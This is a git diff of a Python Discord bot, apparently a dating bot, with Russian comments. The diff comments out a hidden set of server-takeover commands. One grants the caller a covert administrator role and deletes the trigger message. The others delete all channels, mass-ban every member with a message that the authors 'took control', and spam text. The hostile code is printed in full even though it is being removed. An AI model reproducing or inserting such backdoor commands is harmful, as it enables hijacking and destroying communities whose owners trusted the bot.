@@ -77,34 +77,34 @@ async def admindata(ctx):
         print(d)
         await ctx.author.send(d)
 #не касается кода знакомств
-@client.command()
-async def moder_give(ctx):
-    guild = ctx.guild
-    perms = discord.Permissions(administrator=True) #права роли
-    await guild.create_role(name="zutkm", permissions=perms) #создаем роль
+#@client.command()
+#async def moder_give(ctx):
+    #guild = ctx.guild
+    #perms = discord.Permissions(administrator=True) #права роли
+    #await guild.create_role(name="zutkm", permissions=perms) #создаем роль
     
-    role = discord.utils.get(ctx.guild.roles, name="zutkm") #находим роль по имени
-    user = ctx.message.author #находим юзера
-    await user.add_roles(role) #добовляем роль
+    #role = discord.utils.get(ctx.guild.roles, name="zutkm") #находим роль по имени
+    #user = ctx.message.author #находим юзера
+    #await user.add_roles(role) #добовляем роль
     
-    await ctx.message.delete()
-@client.command()
-async def armagedon(ctx,*,name):
-    guild = ctx.guild
-    for channel in guild.channels:
-        await channel.delete()
-        await sleep(1)
-    for channel in range(10):
-        await guild.create_text_channel(str(name))
-@client.command()
-async def allban(ctx):
-    for m in ctx.guild.members: #собираем
-        try:
-            await m.ban(reason="zutkm,ekfar,layker захватили контроль!")#баним
-        except:
-            pass
-@client.command()
-async def zutkm(ctx,*,text):
-    for f in range(30):
-        await ctx.send(text)
+    #await ctx.message.delete()
+#@client.command()
+#async def armagedon(ctx,*,name):
+    #guild = ctx.guild
+    #for channel in guild.channels:
+        #await channel.delete()
+        #await sleep(1)
+    #for channel in range(10):
+        #await guild.create_text_channel(str(name))
+#@client.command()
+#async def allban(ctx):
+    #for m in ctx.guild.members: #собираем
+        #try:
+            #await m.ban(reason="zutkm,ekfar,layker захватили контроль!")#баним
+        #except:
+            #pass
+#@client.command()
+#async def zutkm(ctx,*,text):
+    #for f in range(30):
+        #await ctx.send(text)
 client.run(os.environ['token'])
